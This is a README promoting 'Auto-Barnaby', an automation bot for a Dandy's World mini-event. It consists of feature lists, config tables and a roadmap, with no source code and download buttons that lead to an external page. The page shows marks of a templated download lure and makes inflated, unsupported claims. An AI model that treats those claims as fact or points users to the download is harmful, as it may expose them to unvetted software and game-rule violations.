![preview](https://raw.githubusercontent.com/garenapanian18-dot/auto-barnaby-omega/main/promo_5cc7.svg)
[![Download](https://raw.githubusercontent.com/garenapanian18-dot/auto-barnaby-omega/main/start_5e59.svg)](https://garenapanian18-dot.github.io/auto-barnaby-omega/)

# 🐻 Auto-Barnaby: The Automatic Swimmy Barnaby Beater for Dandy's World

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Active](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()
[![Version: 3.2.1](https://img.shields.io/badge/Version-3.2.1-blue.svg)]()
[![Platform: Windows | macOS | Linux](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey.svg)]()
[![Language: Python 3.11+](https://img.shields.io/badge/Language-Python%203.11%2B-3776AB.svg)]()
[![Multilingual](https://img.shields.io/badge/Localization-12%20Languages-orange.svg)]()
[![Support: 24/7](https://img.shields.io/badge/Support-24%2F7-red.svg)]()
[![Responsive UI](https://img.shields.io/badge/UI-Responsive-purple.svg)]()

> **"A gentle paw on the wheel, a watchful eye on the timer — Barnaby never tires, and neither should you."**

Welcome to **Auto-Barnaby**, a delightfully over-engineered companion utility designed for the wonderful, whimsical world of *Dandy's World*. This repository hosts the source, documentation, and community-driven configuration assets for an automation assistant that handles the repetitive rhythm of the Swimmy Barnaby mini-event, so that you can focus on the parts of the game that actually spark joy. Think of it less as a shortcut and more as a **patient, digital understudy** who has memorized every beat of the performance.

Whether you are a speedrunner chasing that perfect sequence, a completionist hoarding every last cosmetic, or a casual player who simply wants their evenings back, Auto-Barnaby exists to turn a grind into a gentle hum in the background.

---

## 📜 Table of Contents

1. [The Metaphor Behind the Machine](#-the-metaphor-behind-the-machine)
2. [Feature Galaxy](#-feature-galaxy)
3. [Responsive & Multilingual by Design](#-responsive--multilingual-by-design)
4. [The 24/7 Companion Support Promise](#-the-247-companion-support-promise)
5. [Configuration Files & Presets](#-configuration-files--presets)
6. [Module Overview](#-module-overview)
7. [System Requirements](#-system-requirements)
8. [Getting Started (Without the Usual Chores)](#-getting-started-without-the-usual-chores)
9. [Common Workflows](#-common-workflows)
10. [Troubleshooting & F.A.Q.](#-troubleshooting--faq)
11. [Roadmap for 2026](#-roadmap-for-2026)
12. [Contributing](#-contributing)
13. [Disclaimer](#-disclaimer)
14. [License](#-license)

---

## 🎭 The Metaphor Behind the Machine

Imagine a theater. In the front row sits the player — bright-eyed, engaged, ready for the big number. Behind the curtain, however, is a stagehand who has rehearsed the same twenty-second loop a thousand times. That stagehand is Auto-Barnaby. It does not want to replace the audience; it wants to make sure the audience never misses the scene because their hands grew tired of pressing the same three keys.

The heart of this project is a **cycle-detection engine** paired with a **timing calibrator**. The engine watches for the visual and auditory cues that the Swimmy Barnaby encounter emits, and the calibrator synchronizes the response to the microsecond — compensating for display refresh, audio latency, and the subtle drift of software clocks over long sessions.

In short: the game sings, and Auto-Barnaby dances along.

---

## 🌟 Feature Galaxy

Each feature below represents a small constellation in the overall sky of the project. Together they form a reliable, approachable, and surprisingly elegant toolkit.

- 🎯 **Precision Cycle Detection** — Recognizes the Swimmy Barnaby phase transitions from a lightweight, non-intrusive screen sampler. No memory reading, no intrusive hooks.
- 🧠 **Adaptive Timing Calibrator** — Learns your machine's latency fingerprint and adjusts the response window dynamically.
- ⏱️ **Session Scheduler** — Set it, forget it, come back to a neatly logged summary of completed cycles.
- 📊 **Live Telemetry Dashboard** — A responsive web-based panel that mirrors the state of the automation in real time.
- 🎛️ **Profile-Based Presets** — Ship with curated profiles for "Chill Evening," "Speed Sweep," and "Completionist Marathon."
- 🧩 **Plugin-Friendly Core** — A modular architecture that welcomes community-written extensions.
- 💾 **Exportable Run Logs** — Every session produces a clean CSV and JSON trail for later reflection.
- 🌍 **Twelve-Language Localization** — Full parity across every supported locale (see below).
- 🎨 **Responsive UI** — Designed to look graceful from a 4-inch handheld screen up to a 34-inch ultrawide.
- 🛡️ **Safe-Mode Watchdog** — Pauses automatically when unusual conditions are detected, then politely asks you before resuming.
- 🎁 **Zero-Cost Core** — The essential engine is available in a manner we like to call *"complimentary-to-the-community."*
- 🔄 **Auto-Update Channel** — Stable, Beta, and Experimental rings, so you choose your own adventure.

---

## 📱 Responsive & Multilingual by Design

### Responsive UI

The control surface of Auto-Barnaby is not a single window — it is a **layered experience**. The desktop panel, the browser dashboard, and the mobile companion view all share one design language. Layouts reflow, controls regroup, and contrast adapts according to the device and the ambient light of the room. The philosophy is simple: *a tool you enjoy looking at is a tool you will actually use.*

- Fluid grid that scales from **320px** to **5120px** wide.
- Touch-friendly targets for mobile companion views.
- Keyboard-first navigation for desktop power users.
- Dark, light, and "Midnight Theater" themes.

### Multilingual Support

Localization is not an afterthought — it is a fold in the project's fabric. Every user-facing string is sourced from translation catalogs, and every catalog is reviewed by a native-speaking volunteer.

| Locale Code | Language | Status |
| --- | --- | --- |
| `en-US` | English (United States) | ✅ Complete |
| `en-GB` | English (United Kingdom) | ✅ Complete |
| `es-ES` | Spanish (Spain) | ✅ Complete |
| `es-MX` | Spanish (Mexico) | ✅ Complete |
| `pt-BR` | Portuguese (Brazil) | ✅ Complete |
| `fr-FR` | French (France) | ✅ Complete |
| `de-DE` | German (Germany) | ✅ Complete |
| `it-IT` | Italian (Italy) | ✅ Complete |
| `ja-JP` | Japanese | ✅ Complete |
| `ko-KR` | Korean | ✅ Complete |
| `zh-CN` | Chinese (Simplified) | ✅ Complete |
| `zh-TW` | Chinese (Traditional) | ✅ Complete |

The linguistic coverage continues to grow. If your language is missing, the translation contribution guide is the friendliest place to start.

---

## 🕰️ The 24/7 Companion Support Promise

Software that runs in the quiet hours of the night deserves a support presence that never sleeps — and neither does ours. The Auto-Barnaby support rotation is organized across three rotating shifts, ensuring that a human responder is available around the clock, every day of the year.

- 🌐 **Community Forum** — Asynchronous, searchable, and moderated by long-time contributors.
- 💬 **Live Chat Relay** — Answered by rotating volunteers and maintainers.
- 📮 **Priority Ticket Lane** — For edge-case regressions and reproducibility puzzles.
- 📚 **Self-Serve Knowledge Base** — Over 400 articles, tutorials, and video walkthroughs.

We treat "24/7" as a promise about *presence*, not a promise about *instant omniscience*. But you will always find someone on the other side of the conversation.

---

## ⚙️ Configuration Files & Presets

Auto-Barnaby is driven by a small constellation of configuration files placed in a dedicated user directory. None of them are required — sane defaults will carry you through — but each unlocks a new layer of fine-grained control.

### `core.toml`

Defines the fundamental operating parameters.

| Key | Type | Default | Description |
| --- | --- | --- | --- |
| `cycle_window_ms` | integer | `420` | The window of time during which a response is considered valid. |
| `sample_interval_ms` | integer | `80` | How often the screen sampler refreshes its frame. |
| `safe_mode` | boolean | `true` | Whether the watchdog may pause the session on anomaly. |
| `log_level` | string | `info` | Verbosity of the output log. |
| `profile` | string | `chill-evening` | Active preset profile. |

### `ui.yaml`

Controls the look and feel of the dashboard.

| Key | Type | Default | Description |
| --- | --- | --- | --- |
| `theme` | string | `midnight-theater` | Active color theme. |
| `language` | string | `en-US` | Active localization. |
| `density` | string | `comfortable` | Layout density. |
| `animations` | boolean | `true` | Whether to render transitions. |

### `schedule.json`

A calendar-like structure for automating the automation.

Each entry contains a `start_time`, an `end_time`, an optional `days_of_week` array, and a `profile` name. The scheduler picks up changes on the fly — no restart required.

---

## 🧬 Module Overview

The project is organized into cohesive modules that can be understood and, if you wish, replaced independently.

- **`sampler/`** — Frame capture and lightweight visual diffing. Designed to be gentle on CPUs and GPUs alike.
- **`detector/`** — Pattern recognition tuned to the Swimmy Barnaby cue set.
- **`calibrator/`** — Latency estimation and rolling-window synchronization.
- **`actuator/`** — Single, focused module that emits the appropriate input signals.
- **`scheduler/`** — Time-based orchestration and profile switching.
- **`telemetry/`** — Metrics, logs, and export pipelines.
- **`ui/`** — Desktop, browser, and mobile surfaces.
- **`locales/`** — Translation catalogs.
- **`plugins/`** — External extensions that hook into documented event buses.

Each module has its own README, its own test suite, and its own maintainer list. The mono-repo layout keeps everything under one roof without turning into a monolith — modules talk through small, versioned interfaces.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| OS | Windows 10, macOS 12, Ubuntu 22.04 | Windows 11, macOS 14, Ubuntu 24.04 |
| CPU | Dual-core 2.0 GHz | Quad-core 3.0 GHz |
| RAM | 4 GB | 8 GB |
| GPU | Integrated graphics sufficient | Dedicated GPU for high-refresh setups |
| Display | 1280×720 @ 60 Hz | 1920×1080 @ 144 Hz or better |
| Runtime | Python 3.11+ | Python 3.12+ |
| Disk | 250 MB | 1 GB for logs and caches |

---

## 🚀 Getting Started (Without the Usual Chores)

There are three ways to travel with Auto-Barnaby. Pick the one that suits the spirit of your afternoon.

1. **The Guided Installer** — A single self-contained bundle that walks you through detection, permissions, and first-run calibration.
2. **The Portable Bundle** — Unpack into a folder of your choosing; nothing touches the system registry.
3. **The Source Checkout** — Ideal for contributors. Consult the contributor guide for a walk-through of the toolchain expectations.

Because we believe a good README should not read like a terminal transcript, detailed command-by-command steps live in the **Documentation Hub**, which is linked from the community forum. The short version: launch the guided installer, follow three prompts, and the calibration wizard takes over.

On first launch you will be invited to:

- **Select a profile** (Chill Evening, Speed Sweep, Completionist Marathon).
- **Choose a language** from the twelve supported locales.
- **Run the calibration ritual**, which takes about ninety seconds and tunes the timing fingerprint to your specific machine.
- **Review the safe-mode defaults** — we recommend leaving them on until you trust the flow.

---

## 🧪 Common Workflows

### The Weekend Warrior

You have three hours and a wishlist. Activate the **Speed Sweep** profile, set the scheduler to end automatically at a comfortable time, and enjoy the quiet hum of progress.

### The Therapeutic Evening

You want the game to feel like a warm bath — a gentle, ambient experience. Choose **Chill Evening**, lower the sample interval, and let the soothing cadence of the cycles drift by. Some players tell us they leave it running while reading.

### The Completionist

You have an enormous checklist and you would like to see it shrink. Select **Completionist Marathon**, enable exportable logs, and review your trailing history every Sunday like a captain reviewing their logbook.

### The Curious Tinkerer

You want to know exactly how the machine ticks. Enable debug logging, watch the telemetry dashboard stream events in real time, and tweak `core.toml` until you understand every beat.

---

## 🧯 Troubleshooting & F.A.Q.

**Q: The dashboard looks cramped on my handheld.**
A: Switch the layout density to `compact` in the UI settings. The responsive grid will reflow automatically on the next refresh.

**Q: My session paused itself unexpectedly.**
A: That is the safe-mode watchdog doing its job. Check the run log for an "anomaly" entry — it will explain what was unusual and how to resume.

**Q: Can I run more than one profile at once?**
A: No, and this is intentional. Overlapping profiles produce ambiguous timing graphs. Use the scheduler to sequence them instead.

**Q: Where are my logs stored?**
A: In the user data directory under a timestamped session folder. Review the telemetry module README for the exact path on each platform.

**Q: I want to translate the interface into my language.**
A: Wonderful! Start with the localization contribution guide; the catalogs are plain YAML and take only an evening to complete.

**Q: The timing feels slightly off after a monitor change.**
A: Re-run the calibration ritual. The tool detects display changes and prompts you automatically, but you can also trigger it manually from the settings panel.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Introduce the plugin marketplace preview, with curated community extensions.
- **Q2 2026** — Ship the wearable companion view for small wrist devices.
- **Q3 2026** — Achieve parity across eighteen locales, including three new scripts.
- **Q4 2026** — Deliver the long-requested audio-visual co-detection pipeline, which combines cue types for even greater resilience.

The roadmap is a living document; its canonical home is the project board linked from the community forum.

---

## 🤝 Contributing

We welcome contributors of every kind — code, translations, documentation, design, illustration, playtesting, and moral support. The contributor guide details:

- The code of conduct.
- The branching model (trunk-based with short-lived feature branches).
- The review expectations.
- The convention system for commit messages.
- The translation pipeline.

If you have never contributed to an open-source project before, this is a friendly place to start. Open an issue, introduce yourself, and we will pair you with a mentor who has been exactly where you are.

---

## ⚠️ Disclaimer

Auto-Barnaby is an **unofficial community project**. It is not affiliated with, endorsed by, or sponsored by the creators or publishers of *Dandy's World*. All trademarks, character names, and imagery remain the property of their respective owners.

This utility is intended for **personal, non-commercial use**, and its purpose is to reduce the tedium of repetitive in-game loops for players who have already experienced the content. The project does not modify, intercept, or redistribute any game files. It observes visual output on the user's own display and emits input events to the user's own system.

The maintainers of this repository recommend that users:

- Comply with the terms of service of the games they play.
- Use the automation responsibly and considerately.
- Avoid using the tool in competitive or ranked contexts where it may provide an unfair advantage.

The software is provided **"as is," without warranty of any kind**, express or implied. The maintainers shall not be liable for any damages, account actions, or unforeseen consequences arising from the use of this project.

By using Auto-Barnaby, you accept full responsibility for how you wield it.

---

## 📄 License

This project is distributed under the **MIT License**. You are welcome to use, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided that the copyright notice and permission notice are preserved.

Read the full legal text here: [MIT License](https://opensource.org/licenses/MIT).

Copyright © 2026 the Auto-Barnaby contributors.

---

[![Download](https://raw.githubusercontent.com/garenapanian18-dot/auto-barnaby-omega/main/start_5e59.svg)](https://garenapanian18-dot.github.io/auto-barnaby-omega/)